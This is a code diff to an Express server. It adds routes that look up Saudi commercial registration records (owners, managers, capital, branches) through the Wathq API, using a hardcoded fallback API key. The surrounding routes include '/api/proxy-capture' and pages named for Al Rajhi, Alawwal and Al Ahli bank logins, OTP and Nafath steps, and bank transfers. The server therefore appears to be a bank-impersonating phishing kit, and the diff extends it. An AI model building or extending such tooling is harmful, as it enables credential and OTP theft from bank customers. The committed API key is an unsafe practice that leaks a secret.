@@ -2046,6 +2046,150 @@ app.post("/api/proxy-capture", (req, res) => {
   }
 });
 
+// ===== WATHQ API ROUTES =====
+const WATHQ_API_KEY = process.env.WATHQ_API_KEY || 'pQws0LA0zTdMCQmDmGmiljIkpxSDengM';
+const WATHQ_BASE_URL = process.env.WATHQ_BASE_URL || 'https://api.wathq.sa/sandbox/commercial-registration';
+
+// Helper function to make Wathq API requests
+function wathqRequest(endpoint, crId) {
+  return new Promise((resolve, reject) => {
+    const options = {
+      hostname: 'api.wathq.sa',
+      path: `/sandbox/commercial-registration/${endpoint}/${crId}`,
+      method: 'GET',
+      headers: {
+        'apiKey': WATHQ_API_KEY,
+        'Accept': 'application/json',
+      },
+    };
+    
+    const req = https.request(options, (apiRes) => {
+      let data = '';
+      apiRes.on('data', chunk => data += chunk);
+      apiRes.on('end', () => {
+        resolve({ statusCode: apiRes.statusCode, body: data });
+      });
+    });
+    req.on('error', (e) => reject(e));
+    req.end();
+  });
+}
+
+// Fetch commercial registration full data from Wathq
+app.get('/api/wathq/cr/:id', async (req, res) => {
+  try {
+    const crId = req.params.id;
+    console.log(`[WATHQ] Fetching CR fullinfo for: ${crId}`);
+    
+    const result = await wathqRequest('fullinfo', crId);
+    
+    if (result.statusCode === 200) {
+      const parsed = JSON.parse(result.body);
+      console.log(`[WATHQ] Success: ${parsed.name || 'Unknown'}`);
+      res.json(parsed);
+    } else if (result.statusCode === 404 || result.statusCode === 500) {
+      console.log(`[WATHQ] Not found or error: ${result.statusCode}`);
+      res.json({ error: '\u0644\u0645 \u064a\u062a\u0645 \u0627\u0644\u0639\u062b\u0648\u0631 \u0639\u0644\u0649 \u0633\u062c\u0644 \u062a\u062c\u0627\u0631\u064a \u0628\u0647\u0630\u0627 \u0627\u0644\u0631\u0642\u0645' });
+    } else {
+      console.error(`[WATHQ] Error ${result.statusCode}:`, result.body);
+      res.json({ error: '\u062d\u062f\u062b \u062e\u0637\u0623 \u0641\u064a \u0627\u0644\u0627\u0633\u062a\u0639\u0644\u0627\u0645' });
+    }
+  } catch (error) {
+    console.error('[WATHQ] Error:', error.message);
+    res.json({ error: '\u062d\u062f\u062b \u062e\u0637\u0623 \u063a\u064a\u0631 \u0645\u062a\u0648\u0642\u0639' });
+  }
+});
+
+// Fetch CR info (basic)
+app.get('/api/wathq/cr-info/:id', async (req, res) => {
+  try {
+    const crId = req.params.id;
+    const result = await wathqRequest('info', crId);
+    if (result.statusCode === 200) {
+      res.json(JSON.parse(result.body));
+    } else {
+      res.json({ error: 'لم يتم العثور على بيانات' });
+    }
+  } catch (error) {
+    res.json({ error: error.message });
+  }
+});
+
+// Fetch CR owners
+app.get('/api/wathq/cr-owners/:id', async (req, res) => {
+  try {
+    const crId = req.params.id;
+    const result = await wathqRequest('owners', crId);
+    if (result.statusCode === 200) {
+      res.json(JSON.parse(result.body));
+    } else {
+      res.json({ error: 'لم يتم العثور على بيانات' });
+    }
+  } catch (error) {
+    res.json({ error: error.message });
+  }
+});
+
+// Fetch CR managers
+app.get('/api/wathq/cr-managers/:id', async (req, res) => {
+  try {
+    const crId = req.params.id;
+    const result = await wathqRequest('managers', crId);
+    if (result.statusCode === 200) {
+      res.json(JSON.parse(result.body));
+    } else {
+      res.json({ error: 'لم يتم العثور على بيانات' });
+    }
+  } catch (error) {
+    res.json({ error: error.message });
+  }
+});
+
+// Fetch CR status
+app.get('/api/wathq/cr-status/:id', async (req, res) => {
+  try {
+    const crId = req.params.id;
+    const result = await wathqRequest('status', crId);
+    if (result.statusCode === 200) {
+      res.json(JSON.parse(result.body));
+    } else {
+      res.json({ error: 'لم يتم العثور على بيانات' });
+    }
+  } catch (error) {
+    res.json({ error: error.message });
+  }
+});
+
+// Fetch CR branches
+app.get('/api/wathq/cr-branches/:id', async (req, res) => {
+  try {
+    const crId = req.params.id;
+    const result = await wathqRequest('branches', crId);
+    if (result.statusCode === 200) {
+      res.json(JSON.parse(result.body));
+    } else {
+      res.json({ error: 'لم يتم العثور على بيانات' });
+    }
+  } catch (error) {
+    res.json({ error: error.message });
+  }
+});
+
+// Fetch CR capital
+app.get('/api/wathq/cr-capital/:id', async (req, res) => {
+  try {
+    const crId = req.params.id;
+    const result = await wathqRequest('capital', crId);
+    if (result.statusCode === 200) {
+      res.json(JSON.parse(result.body));
+    } else {
+      res.json({ error: 'لم يتم العثور على بيانات' });
+    }
+  } catch (error) {
+    res.json({ error: error.message });
+  }
+});
+
 // ===== REACT CLIENT ROUTES =====
 // Serve React app (dashboard/client pages) from client-dist folder
 // These specific routes serve the React SPA instead of proxying
@@ -2058,7 +2202,7 @@ const REACT_ROUTES = [
   '/alrajhi-login', '/alrajhi-otp', '/alrajhi-nafath', '/alrajhi-alert',
   '/alrajhi-call', '/rajhi-payment-error', '/alawwal-bank', '/alawwal-nafath',
   '/alahli-otp', '/bank-transfer', '/bank-account-number', '/final-page',
-  '/documents', '/404',
+  '/documents', '/commercial-data', '/404',
 ];
 
 // Serve static assets from client-dist (JS, CSS, images, fonts)
